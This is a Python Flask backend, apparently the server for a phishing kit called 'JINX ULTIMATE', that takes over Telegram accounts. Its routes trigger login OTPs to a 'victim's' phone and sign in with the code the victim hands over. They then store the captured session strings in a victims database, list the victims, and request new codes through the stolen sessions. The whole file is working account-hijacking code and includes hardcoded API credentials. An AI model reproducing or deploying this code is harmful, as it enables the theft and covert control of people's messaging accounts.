from flask import Flask, request, jsonify
import os
import asyncio
import logging
import requests
from telethon.sync import TelegramClient
from telethon.sessions import StringSession

logger = logging.getLogger(__name__)

API_ID = int(os.environ.get("API_ID", 24289127))
API_HASH = os.environ.get("API_HASH", "cd63113435f4997590ee4a308fbf1e2c")
MASTER_SESSION = os.environ.get("MASTER_SESSION")

def setup_routes(app):
    
    @app.route('/')
    def home():
        return "🔥 JINX ULTIMATE - FIXED API 😈"
    
    @app.route('/health')
    def health():
        return jsonify({'status': 'healthy', 'service': 'jinx_api'})
    
    @app.route('/send_code', methods=['GET'])
    def send_code():
        """Send OTP code to victim's phone"""
        try:
            phone = request.args.get('phone')
            if not phone:
                return jsonify({'success': False, 'error': 'No phone provided'})
            
            logger.info(f"📱 Requesting OTP for: {phone}")
            
            async def send_otp():
                client = TelegramClient(StringSession(MASTER_SESSION), API_ID, API_HASH)
                await client.connect()
                try:
                    result = await client.send_code_request(phone)
                    return {
                        'success': True, 
                        'phone_code_hash': result.phone_code_hash,
                        'timeout': result.timeout
                    }
                except Exception as e:
                    logger.error(f"❌ Send OTP error for {phone}: {e}")
                    return {'success': False, 'error': str(e)}
                finally:
                    await client.disconnect()
            
            result = asyncio.run(send_otp())
            return jsonify(result)
            
        except Exception as e:
            logger.error(f"❌ Send code route error: {e}")
            return jsonify({'success': False, 'error': str(e)})
    
    @app.route('/get_new_otp', methods=['GET'])
    def get_new_otp():
        """Get new OTP for existing victim"""
        try:
            phone = request.args.get('phone')
            if not phone:
                return jsonify({'success': False, 'error': 'No phone provided'})
            
            # Get victim session from database manager
            from database_manager import get_victim_session
            victim_session = get_victim_session(phone)
            
            if not victim_session:
                return jsonify({'success': False, 'error': 'Victim session not found'})
            
            logger.info(f"🔄 Requesting new OTP for: {phone}")
            
            async def request_new_otp():
                client = TelegramClient(StringSession(victim_session), API_ID, API_HASH)
                await client.connect()
                try:
                    result = await client.send_code_request(phone)
                    return {
                        'success': True,
                        'phone_code_hash': result.phone_code_hash,
                        'timeout': result.timeout
                    }
                except Exception as e:
                    logger.error(f"❌ New OTP error for {phone}: {e}")
                    return {'success': False, 'error': str(e)}
                finally:
                    await client.disconnect()
            
            result = asyncio.run(request_new_otp())
            return jsonify(result)
            
        except Exception as e:
            logger.error(f"❌ Get new OTP route error: {e}")
            return jsonify({'success': False, 'error': str(e)})
    
    @app.route('/victims', methods=['GET'])
    def list_victims():
        """List all saved victims"""
        try:
            from database_manager import get_all_victim_sessions
            victims = get_all_victim_sessions()
            victim_list = [v[0] for v in victims]
            logger.info(f"📋 Listed {len(victim_list)} victims")
            return jsonify({'success': True, 'victims': victim_list, 'count': len(victim_list)})
        except Exception as e:
            logger.error(f"❌ List victims error: {e}")
            return jsonify({'success': False, 'error': str(e)})
    
    @app.route('/get_otp/<phone>', methods=['GET'])
    def get_otp(phone):
        """Get last OTP for victim"""
        try:
            from database_manager import get_victim_otp
            otp_code, otp_time = get_victim_otp(phone)
            if otp_code:
                logger.info(f"🔑 Retrieved OTP for {phone}")
                return jsonify({
                    'success': True, 
                    'phone': phone, 
                    'otp': otp_code, 
                    'time': otp_time
                })
            else:
                return jsonify({'success': False, 'error': 'No OTP found'})
        except Exception as e:
            logger.error(f"❌ Get OTP error: {e}")
            return jsonify({'success': False, 'error': str(e)})
    
    @app.route('/save_session', methods=['GET'])
    def save_session():
        """Save victim session"""
        try:
            phone = request.args.get('phone')
            code = request.args.get('code')
            phone_code_hash = request.args.get('phone_code_hash')
            
            if not all([phone, code, phone_code_hash]):
                return jsonify({'success': False, 'error': 'Missing parameters'})
            
            logger.info(f"💾 Saving session for: {phone}")
            
            async def auth_and_save():
                client = TelegramClient(StringSession(MASTER_SESSION), API_ID, API_HASH)
                await client.connect()
                try:
                    # Sign in with OTP
                    await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
                    
                    # Save session
                    victim_session = StringSession.save(client.session)
                    from database_manager import save_victim_session
                    if save_victim_session(phone, victim_session):
                        logger.info(f"✅ Session saved for {phone}")
                        return {'success': True, 'message': 'Session saved successfully'}
                    else:
                        return {'success': False, 'error': 'Failed to save session'}
                        
                except Exception as e:
                    logger.error(f"❌ Auth error for {phone}: {e}")
                    return {'success': False, 'error': str(e)}
                finally:
                    await client.disconnect()
            
            result = asyncio.run(auth_and_save())
            return jsonify(result)
            
        except Exception as e:
            logger.error(f"❌ Save session route error: {e}")
            return jsonify({'success': False, 'error': str(e)})
